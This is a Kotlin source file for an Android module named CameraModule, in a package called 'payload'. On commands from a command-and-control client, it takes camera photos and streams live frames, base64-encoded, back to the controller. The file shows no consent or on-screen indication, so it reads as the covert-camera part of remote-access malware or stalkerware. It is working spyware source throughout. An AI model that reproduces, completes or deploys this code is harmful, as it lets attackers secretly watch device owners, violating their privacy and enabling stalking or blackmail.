package com.ihk909.payload.modules

import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CameraMetadata
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import com.ihk909.payload.C2Client
import org.json.JSONObject
import java.util.Collections

object CameraModule {
    private var openCam: CameraDevice? = null
    private var liveReader: ImageReader? = null
    private var liveThread: HandlerThread? = null
    @Volatile private var streaming = false

    fun snap(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        runCatching {
            val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cam = args.optString("camera", "0")
            val ht = HandlerThread("cam").apply { start() }
            val h = Handler(ht.looper)
            val r = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1)

            r.setOnImageAvailableListener({ reader ->
                runCatching {
                    val img = reader.acquireLatestImage() ?: return@runCatching
                    img.use {
                        val buf = it.planes[0].buffer
                        val b = ByteArray(buf.remaining())
                        buf.get(b)
                        c2.reply(id, JSONObject().put("jpeg_b64", Base64.encodeToString(b, Base64.NO_WRAP)))
                    }
                    reader.close()
                }.onFailure { c2.replyError(id, it.message ?: "error") }
                    .also { ht.quitSafely() }
            }, h)

            cm.openCamera(cam, object : CameraDevice.StateCallback() {
                override fun onOpened(d: CameraDevice) {
                    runCatching {
                        val b = d.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                            .apply { addTarget(r.surface) }
                        d.createCaptureSession(Collections.singletonList(r.surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(s: CameraCaptureSession) {
                                    runCatching { s.capture(b.build(), null, h) }
                                        .onFailure { c2.replyError(id, it.message ?: "error") }
                                }
                                override fun onConfigureFailed(s: CameraCaptureSession) {
                                    c2.replyError(id, "config failed")
                                }
                            }, h)
                    }.onFailure { c2.replyError(id, it.message ?: "error") }
                }
                override fun onDisconnected(d: CameraDevice) { d.close() }
                override fun onError(d: CameraDevice, code: Int) { c2.replyError(id, "err $code") }
            }, h)
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }

    fun startStream(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        runCatching {
            val camId = args.optString("camera", "0")
            val quality = args.optInt("quality", 35)

            val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            liveThread = HandlerThread("camLive").apply { start() }
            val h = Handler(liveThread!!.looper)

            liveReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 3)
            liveReader!!.setOnImageAvailableListener({ reader ->
                if (!streaming) return@setOnImageAvailableListener
                runCatching {
                    val img = reader.acquireLatestImage() ?: return@runCatching
                    img.use {
                        val buf = it.planes[0].buffer
                        val b = ByteArray(buf.remaining())
                        buf.get(b)
                        c2.event("cam_frame", JSONObject()
                            .put("jpeg_b64", Base64.encodeToString(b, Base64.NO_WRAP))
                            .put("ts", System.currentTimeMillis()))
                    }
                }
            }, h)

            cm.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(d: CameraDevice) {
                    openCam = d
                    streaming = true
                    runCatching {
                        val b = d.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                            .apply {
                                addTarget(liveReader!!.surface)
                                set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                                set(CaptureRequest.JPEG_QUALITY, quality.toByte())
                            }
                        d.createCaptureSession(Collections.singletonList(liveReader!!.surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(s: CameraCaptureSession) {
                                    runCatching {
                                        s.setRepeatingRequest(b.build(), null, h)
                                        c2.reply(id, JSONObject().put("streaming", true))
                                    }.onFailure { c2.replyError(id, it.message ?: "error") }
                                }
                                override fun onConfigureFailed(s: CameraCaptureSession) {
                                    c2.replyError(id, "config failed")
                                }
                            }, h)
                    }.onFailure { c2.replyError(id, it.message ?: "error") }
                }
                override fun onDisconnected(d: CameraDevice) { d.close() }
                override fun onError(d: CameraDevice, code: Int) { c2.replyError(id, "err $code") }
            }, h)
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }

    fun stopStream(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        streaming = false
        openCam?.close(); openCam = null
        liveReader?.close(); liveReader = null
        liveThread?.quitSafely(); liveThread = null
        c2.reply(id, JSONObject().put("stopped", true))
    }
}